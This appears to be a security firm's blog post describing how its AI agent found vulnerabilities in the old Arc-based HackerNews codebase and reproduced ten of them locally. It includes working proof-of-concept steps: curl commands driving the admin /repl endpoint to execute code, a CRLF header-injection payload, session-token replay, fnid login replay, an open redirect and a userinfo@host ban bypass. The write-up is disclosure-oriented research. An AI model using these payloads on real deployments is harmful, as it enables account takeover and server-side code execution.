---
schema_version: "1.0.0"
document_id: "f11425b509e84223d7c6de4cf2acabdceee0123974dd7aeb5f151cec49f98bf8"
company_key: "yc-winfunc"
company: "winfunc"
source_id: "yc-winfunc-rss-7ebe4d6da681"
canonical_url: "https://winfunc.com/research/hacking-the-old-hackernews-codebase"
published_at: "2026-04-18T00:00:00+00:00"
first_seen_at: "2026-07-20T23:21:05.938183+00:00"
fetched_at: "2026-07-28T22:15:51.462388+00:00"
content_hash: "sha256:471fc2873f4c73977918d523040951d6afbff986602227a5b7373b2d0524cf1e"
---

# Hacking the old HackerNews codebase

We wrote this post to showcase what our AI hacking agent is capable of. And for fun!


During YC (we're a[YC S24 company](https://www.ycombinator.com/companies/winfunc) !), we had the awesome opportunity to meet PG and talk about our product.


To showcase a fun demo, I remember opening my laptop in the Uber to his home and challenging our agents to find vulnerabilities in the old HackerNews codebase written in Arc.


For those unfamiliar, Arc is a programming language designed by Paul Graham and Robert Morris. And the old[HackerNews](https://github.com/wting/hackernews) codebase is written in Arc.


It did *kinda* well but this was when Claude Sonnet 3.5 was the frontier model.


The models we have now changes the picture entirely, especially when equipped with a specialized harness.


This blog goes over the complete details of this fun experiment.


The **TL;DR** is: Our agent discovered 10 vulnerabilities with complete proof-of-concept and exploit. Here's the PDF export of the audit produced by Winfunc:


[Read the Winfunc Audit Report](https://winfunc.com/post-assets/hacking-the-old-hackernews-codebase/Security%20Report%20-%20hackernews%20(12%20vulnerabilities).pdf?v=392a0130) .


## First, getting this thing to run


The[repo](https://github.com/wting/hackernews) looks small. The runtime is a bit of a trap.


The code in this checkout is Arc 3.0-era code. The README says to use MzScheme 372. We tried modern Racket first and ran straight into the old mutable-pair problem. Newer Racket can fake parts of the legacy environment, but this codebase expects the old behavior all the way down.


The least painful way we found was an` amd64` Debian container with MzScheme 372 installed from the historical PLT Scheme bundle.


We used:


BASH


```text
curl -L -o /tmp/mz-372-bin-x86_64-linux-f7.sh \
http://download.plt-scheme.org/bundles/372/mz/mz-372-bin-x86_64-linux-f7.sh


```


Then a tiny image:


DOCKERFILE


```text
FROM --platform=linux/amd64 debian:12-slim
RUN apt-get update && apt-get install -y --no-install-recommends openssl ca-certificates curl && rm -rf /var/lib/apt/lists/*
COPY mz-372-bin-x86_64-linux-f7.sh /tmp/mz.sh
RUN set -eux; mkdir -p /opt/plt372; cd /opt/plt372; printf 'no\n4\n' | sh /tmp/mz.sh > /tmp/install.log 2>&1
WORKDIR /work


```


And a bootstrap script:


SCHEME


```text
(require mzscheme)
(current-directory "/work")
(require (file "/work/ac.scm"))
(require (file "/work/brackets.scm"))
(use-bracket-readtable)
(aload "arc.arc")
(aload "libs.arc")
(arc-eval '(load "news.arc"))
(arc-eval '(nsv 8080))


```


After that, the app came up cleanly at` http://127.0.0.1:8080` .


## What we found


Winfunc discovered 12 total findings.


After reproducing them against live instances, we ended up with this:


ID Finding Verdict


1 Admin` /repl` executes attacker-controlled code via plain web request Valid


2 Bootstrap admin username can be claimed through public signup Valid


3 Comment edit path skips comment kill rules Valid


4 Memoized URL validation grows memory without bound Valid


5` userinfo@host` URLs bypass site-ban logic Valid


6 Vote-after-login continuation treated as CSRF Invalid


7 Login redirect can inject response headers Valid


8 Concurrent auth-state saves cause durable on-disk corruption Invalid


9 Vote/login open redirect Valid, same root cause as 12


10 Vote URLs and logs leak reusable session tokens Valid


11 Public login` fnid` replay swaps victim into attacker account Valid


12 Vote/login flow redirects to attacker-controlled external URL Valid


Ten survived. Two didn't.


That's a pretty good showing, and the misses are useful too. One of the invalid findings turned out to be ordinary product behavior dressed up as CSRF. The other exposed a real race, but not the durable auth-file corruption the report claimed. This is desirable because it's exactly the kind of pruning you want if you're trying to use a system like this in the real world.


## The bugs that held up


### 1. Bootstrap admin takeover


This is somewhat of an intended behaviour, it's just not secure implementation.


The repository's setup notes tell you to put an admin username in` arc/admins` , start the server, click` login` , and create that account. The app grants admin status by username membership in` admins*` . It does not protect that name during public self-registration.


On a fresh instance with` arc/admins` containing only` adminrace` , we did this:


1. hit` /whoami`
2. followed the public` Log in` link
3. used the` Create Account` form to register` adminrace`


The response set:


TEXT


```text
Set-Cookie: user=zsK6Njzs; expires=Sun, 17-Jan-2038 19:14:07 GMT


```


Using that cookie, both` /admin` and` /prompt` worked right away.


That means a fresh public deployment can hand its admin account to the first person who shows up and guesses the bootstrap name.


And this can be chained. Because once the bootstrap admin is yours, the next bug matters.


### 2.` /repl` is remote code execution with a browser in the middle


The old Prompt app is loaded by default, and it still has a web REPL:


- ` /prompt` for apps
- ` /repl` for direct evaluation


The` /repl` route only checks whether the ambient session belongs to an admin. It takes` expr` from the request, parses it, and runs` eval` .


We used the stolen` adminrace` session from the previous bug and sent:


BASH


```text
curl -s -b /tmp/hnf2.jar -c /tmp/hnf2.jar -G \
http://127.0.0.1:8082/repl \
--data-urlencode  'expr=(do (writefile "owned" "arc/repl-csrf") (quote ok))'   \
> /tmp/hnf2-repl.html


```


Then checked the host-side file:


BASH


```text
ls   -l /tmp/hn-f2/arc/repl-csrf
cat   /tmp/hn-f2/arc/repl-csrf


```


Observed:


TEXT


```text
"owned"


```


This is the sort of bug that makes people say "well, it's an admin REPL, what did you expect?" What we expected was a nonce, a POST-only path, an origin check, or any sign that the request had to be deliberate. Instead it's a plain web endpoint that will happily execute code from an authenticated GET.


If you want the shortest version of the exploit chain in this post, it's this:


public signup -> bootstrap admin claim ->` /repl` -> server-side code execution


### 3. Public login` fnid` replay lets you stuff a victim browser into your own account


Arc's` fnid` mechanism is one of the more charming parts of the codebase. It's also where one of the cleaner bugs lives.


The public login form uses a bare` fnform` . The generated` fnid` is stored in a global table, not bound to a browser, not bound to a session, not bound to a user.


We reproduced it with three separate cookie jars:


1. create attacker-controlled account` sockswap`
2. harvest a public login` fnid` from` /login` in a different anonymous session
3. replay that` fnid` from a third, unrelated victim session, but with` u=sockswap&p=pw1234`


The replay response included:


TEXT


```text
Set-Cookie: user=kAtoisWj; expires=Sun, 17-Jan-2038 19:14:07 GMT


```


And the victim session's` /whoami` changed from:


TEXT


```text
You are not logged in.


```


to:


TEXT


```text
sockswap at 192.168.215.1


```


Not credential theft. Something weirder. The victim browser is now operating as the attacker's chosen account.


### 4. The login redirect can inject headers


This one is old-school and fun in a nasty way.


The request parser percent-decodes arguments. Later,` reassemble-args` rebuilds a redirect target without re-encoding them. Then` respond()` prints the result straight into` Location:` .


We used the protected` resetpw` route as the login-gated entry point:


BASH


```text
curl -s -c /tmp/f7.jar -b /tmp/f7.jar \
'http://127.0.0.1:8082/resetpw?x=%0d%0aX-Injected:%20yes'   > /tmp/f7-login.html


```


Then created an account through the returned` /y` form and captured the raw response:


TEXT


```text
HTTP/1.0 302 Moved
Set-Cookie: user=06kM7FS8; expires=Sun, 17-Jan-2038 19:14:07 GMT
Location: resetpw?x=
X-Injected: yes


```


Achieving an injected header line on the application's own origin.


### 5. The vote/login flow is an open redirect


Winfunc logged this twice, once as finding 9 and once as finding 12. Same root cause. We kept both, but they're the same bug.


The flow is:


1. user is logged out
2. attacker sends` /vote?...&whence=<attacker URL>`
3. app shows the normal login page
4. user logs in
5. app redirects to` whence` without checking whether it's on-site


We created` victim2` , created a fresh story with id` 2` , then requested:


TEXT


```text
/vote?for=2&dir=up&whence=http://127.0.0.1:9000/landing


```


After login, the response was:


TEXT


```text
HTTP/1.0 302 Moved
Set-Cookie: user=HSoZtjqU; expires=Sun, 17-Jan-2038 19:14:07 GMT
Location: http://127.0.0.1:9000/landing


```


The target story's score moved from` 0` to` 1` in the same flow.


So the site does two things at once:


- casts the deferred vote
- bounces the browser to an attacker-controlled origin


That second part is the actual bug. The first part just makes the redirect more confusing.


### 6. Vote URLs and news logs leak a reusable session token


This one is fun because the token in` auth=` is not some special-purpose vote nonce. It's actually the live session identifier.


We logged in as` victim3` . The active session cookie was:


TEXT


```text
nwL1Mq4V


```


Then we sent a vote request using that same value in` auth=` and checked the news log:


TEXT


```text
1776450954 192.168.215.1 victim3 vote victim3 3 up nwL1Mq4V news


```


Then we replayed it from another client:


BASH


```text
curl -s -H  "Cookie: user=nwL1Mq4V"   http://127.0.0.1:8082/whoami


```


The server answered:


TEXT


```text
victim3 at 192.168.215.1


```


That's a straight session replay.


The claim in the original finding talked about vote URLs and logs. In our reproduction, the log path alone was enough to prove impact. Once the log has the token, the account is yours until logout.


### 7. Comment moderation only runs on create, not on edit


This is the kind of bug people miss because the code "basically works."


We set the admin comment kill list to:


TEXT


```text
SPAMWORD


```


Then we did the same content two ways as user` commenter1` .


First path:


1. post a benign comment
2. edit it into` buy now SPAMWORD`


That produced comment` 7` , saved as:


TEXT


```text
((votes ...) (by "commenter1") (type comment) ... (text "buy now SPAMWORD") (id 7) ...)


```


No` dead` flag.


Second path:


1. submit a fresh comment directly containing` SPAMWORD`


That produced comment` 8` , saved as:


TEXT


```text
((votes ...) (by "commenter1") (type comment) ... (dead t) (text "direct SPAMWORD submission") (id 8) ...)


```


That's the whole bug in one comparison.


### 8. Site bans can be dodged with` userinfo@host` URLs


The URL parsing here is old enough to have sharp corners in places people forgot existed.


We banned` example.com` with an` ignore` entry in` banned-sites*` , then compared two submissions.


Control:


TEXT


```text
http://example.com/plain-ban-check


```


Observed result:


- redirect to the site message page
- page body said` Stop spamming us. You're wasting your time.`
- no new story created


Bypass:


TEXT


```text
http:// [email protected]  /userinfo-bypass-check


```


Observed result:


- redirect to` newest`
- new story` 6` created
- saved story had no` dead` flag


The parser is treating the userinfo form as a different site name, so the enforcement path never fires.


### 9. Memory growth through memoized URL validation


The app memoizes` valid-url` . The memoizer never evicts. Nil results are cached too. That means rejected inputs still stay around forever.


On a clean instance at` http://127.0.0.1:8085` , we:


1. logged in as a normal authenticated user
2. fetched` /submit` once
3. reused that form token for 50 submissions
4. gave each submission a unique invalid URL string about 50 KB long
5. paced them under the rate limiter
6. measured MzScheme RSS before, after, and after a short idle pause


Observed:


TEXT


```text
rss_before_kb=50400
rss_after_kb=104464
rss_after_idle_kb=104464


```


So the process kept roughly 54 MB of extra resident memory after the requests stopped.


That's a real low-privilege DoS.


## The findings that didn't hold up


Sometimes these models flag vulnerabilities that require "hardening" at best but doesn't really pose an impact when the intended trust-boundary or threat model is taken into account.


### 10. Deferred vote-after-login is behavior, not a security bug


We reproduced the reported behavior exactly:


1. open` /vote?for=1&dir=up&whence=news` while logged out
2. see the first-party page saying` You have to be logged in to vote.`
3. log in
4. watch the score change from` 0` to` 1`


We marked it invalid.


Why? Because the site tells the user, in plain English, that they're logging in to vote. The action isn't hidden. A link can still be used in social engineering, sure. But that's not enough for us to keep it as a confirmed CSRF bug.


### 11. The auth-state race is real, but not in the way the finding claimed


This one was the most annoying to validate.


Winfunc reported a race that could corrupt` arc/hpw` and` arc/cooks` , survive restart, and even make admin-listed names reclaimable. We could reproduce the race symptom. We could not reproduce the rest.


What we saw from a fresh public instance:


TEXT


```text
80 concurrent create-account requests
78 successful HTTP responses
arc/hpw remained readable
arc/hpw contained 78 corresponding accounts
server logs showed rename-file-or-directory errors on arc/cooks.tmp


```


So yes, concurrent public requests do trip over the fixed` file.tmp` path. We also hit rename failures in a direct concurrency stress test against the real` set-pw` path.


But after the race settled:


- the password file was still readable
- the on-disk entries matched the successful requests
- we did not get an empty auth table on reload
- we did not get the follow-on "re-register the admin name after restart" condition


That makes the finding invalid as written. There's still a race-induced reliability bug here. There just wasn't enough to support the reported impact.


## Why we keep using *weird* codebases like this


There's an easy way to oversell this target.


We could say "look, our system found bugs in an old Lisp codebase." That's true, but it misses the interesting part. The interesting part is that Arc is the kind of language that wrecks brittle tooling. No off-the-shelf parser support. Old runtime. Weird macros. Plenty of app logic tucked into code paths that don't look like modern web stacks.


Our product/research makes two claims that this exercise tests directly:


1. it can read code in basically any language
2. it doesn't stop at a report; it pushes through to PoCs and fixes


The older[How Asterisk Works](https://winfunc.com/research/how-winfunc-works) post says the system builds a code graph, generates attack ideas, validates them, and throws away what doesn't survive a running target. It's also exactly what happened here:


- 12 findings in total
- 10 that held up
- 2 that didn't


That's a useful ratio, especially on a codebase this odd ( *for LLMs ig* ).


## Dogfooding these models to be good at hacking


We improve our agents or the new term for it, "harness", on a daily basis based on a lot of evals and benchmarks we conduct.


We have been thinking about this problem/idea since GPT-2 came out. We started practically applying it since GPT-3.5 on CTFs challenges and real-world bug bounties and pentests. We foresaw what's about to happen ever since.


Now "this" is the talk of the town. "Mythos", "GPT-5.4-Cyber", "Trusted Access for Cyber", etc.


One of the other experiments we conduct albeit rarely is letting our agents find 0-days in mission critical software.


## Finding real 0-days with LLMs


We do evals that are beyond just weird codebases btw. On real battle-tested codebases.


So far, we've discovered 0-days in Chromium (dislcosure soon),[NGINX](https://winfunc.com/hacktivity/CVE-2026-28755) ,[Node.js](https://winfunc.com/hacktivity/CVE-2026-21636) ,[React](https://winfunc.com/hacktivity/CVE-2026-23864) (yeah the recent React one),[Bun](https://winfunc.com/hacktivity/bun-yaml-dos) , etc. and more exciting ones that are pending disclosure.


You can see some of our findings on our Hacktivity page:[https://winfunc.com/hacktivity](https://winfunc.com/hacktivity) .


All of them were discovered autonomously by Winfunc with no human-in-the-loop.


## Our OSS auditing initiative


We audited the old HackerNews codebase so of course we're going to post this on HackerNews. So we have an ask/request for the audience.


If you're a maintainer of a widely used non-commercial open-source project, we'd love to audit your codebase for "free". We're basically doing a "mini"[Project Glasswing](https://www.anthropic.com/glasswing) . We'd love to help secure more critical open-source projects.


We've done this before. For example, we audited the Rust crypto implementation of[Ente](https://github.com/ente-io/ente) . They even wrote about us:[https://ente.com/blog/rust-crypto-audit/](https://ente.com/blog/rust-crypto-audit/) . (Thanks!)


If you're a commercial project/company in need of strong proactive security audits, you can book a demo with us.


Thanks for reading our fun little experiment! :)
